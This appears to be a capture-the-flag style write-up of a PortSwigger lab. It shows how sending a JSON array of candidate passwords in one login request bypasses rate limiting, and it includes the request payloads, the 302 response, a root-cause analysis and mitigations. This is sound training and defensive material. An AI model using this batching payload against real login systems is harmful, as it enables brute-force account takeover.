---
title: "PortSwigger: Broken brute-force protection, multiple credentials per request"
date: 2026-11-10 21:20:00 +0530
categories: [PortSwigger, Authentication]
tags: [authentication, brute-force, logic-flaw, json, burp-repeater, expert]
image:
  path: /assets/img/posts/covers/broken-brute-force-protection-multiple-credentials-per-request.png
  alt: "Broken brute-force protection, multiple credentials per request"
description: "Bypassing login rate limiting by submitting an array of candidate passwords in a single JSON request to brute-force Carlos's account."
---

**Platform:** PortSwigger Web Security Academy
**Category:** Authentication
**Difficulty:** Expert
**Date:** 2026-11-10 21:20 IST

## 🎯 Objective

This lab has a logic flaw in its brute-force protection. The goal is to brute-force Carlos's password and access his account page.

- Victim's username: `carlos`
- A list of candidate passwords is provided by the lab.

## 🔍 Recon & Analysis

I opened the login page with Burp running.

![Login page for the lab](/assets/img/posts/broken-brute-force-protection-multiple-credentials-per-request/kali-linux-2026.1-vmware-amd64-2026-11-10-21-13-44.png)

Looking at the request in Burp Proxy, I noticed the `POST /login` request sends credentials in **JSON format** rather than as normal form parameters.

![POST /login request sending credentials as JSON](/assets/img/posts/broken-brute-force-protection-multiple-credentials-per-request/kali-linux-2026.1-vmware-amd64-2026-11-10-12-57-54.png)

```http
POST /login HTTP/2
Host: 0aab00de03cd220d81c97f4300c900ed.web-security-academy.net
Content-Type: application/json
Content-Length: 39

{
    "username":"carlos",
    "password":"test"
}
```

A single wrong password returns an `Invalid username or password` response, as expected.

![Single password returning invalid credentials](/assets/img/posts/broken-brute-force-protection-multiple-credentials-per-request/kali-linux-2026.1-vmware-amd64-2026-11-10-12-58-13.png)

The key observation: because the password is a JSON value, I can try passing an **array** of passwords instead of a single string. If the server loops over the array and checks each one within a single request, it never trips the per-request rate limiting.

## 💥 Exploitation

1. I sent the `POST /login` request to Burp Repeater.

2. I replaced the single string value of `password` with a JSON array containing all the candidate passwords:

   ```http
   POST /login HTTP/2
   Host: 0aab00de03cd220d81c97f4300c900ed.web-security-academy.net
   Content-Type: application/json

   {
       "username":"carlos",
       "password":[
           "123456",
           "password",
           "12345678",
           "qwerty",
           "123456789",
           "12345",
           "1234",
           "111111",
           "1234567",
           "dragon",
           "123123",
           "baseball"
           ...
       ]
   }
   ```

3. I sent the request. Instead of the usual invalid-credentials response, the server returned a **302 redirect** to `/my-account?id=carlos`, which means one of the passwords in the array matched.

   ![Password array returning a 302 redirect to my-account](/assets/img/posts/broken-brute-force-protection-multiple-credentials-per-request/kali-linux-2026.1-vmware-amd64-2026-11-10-21-14-07.png)

   ```http
   HTTP/2 302 Found
   Location: /my-account?id=carlos
   Set-Cookie: session=fSFoM2FemUmY8mqUB0dC7iEOLpf2QiNX; Secure; HttpOnly; SameSite=None
   X-Frame-Options: SAMEORIGIN
   Content-Length: 0
   ```

4. I right-clicked the request and chose **Show response in browser**, copied the URL, and loaded it in the browser. This carried over the authenticated session and logged me in as Carlos.

5. I clicked **My account** to reach Carlos's account page and solve the lab.

   ![Lab solved, logged in as carlos](/assets/img/posts/broken-brute-force-protection-multiple-credentials-per-request/kali-linux-2026.1-vmware-amd64-2026-11-10-21-17-57.png)

## 🧠 Root Cause

The brute-force protection assumes **one credential per request**. The server-side login logic iterates over the `password` field, and because that field accepts a JSON array, it validates every password in the list during a single HTTP request. Rate limiting counts requests, not individual password guesses, so the whole candidate list is tested without ever triggering the lockout or throttle.

## 🛡️ Mitigation

- Enforce strict input validation on the `password` field so it only accepts a single string; reject arrays or unexpected types.
- Count and rate-limit **password attempts**, not just HTTP requests.
- Reject malformed or unexpected JSON structures with a 400 before any credential check.
- Add account-level lockouts and anomaly detection that notice many guesses against one username regardless of how they are packaged.

## 📝 Key Takeaways

- JSON login endpoints expand the attack surface: a value that looks like a string can be swapped for an array.
- Rate limiting that counts requests rather than guesses is trivially bypassed by batching guesses into one request.
- A `302` response on a login endpoint is a strong signal of a successful authentication.
- Always test how an endpoint handles unexpected data types, not just unexpected values.

## 🔧 Tools Used

- Burp Suite (Proxy, Repeater)
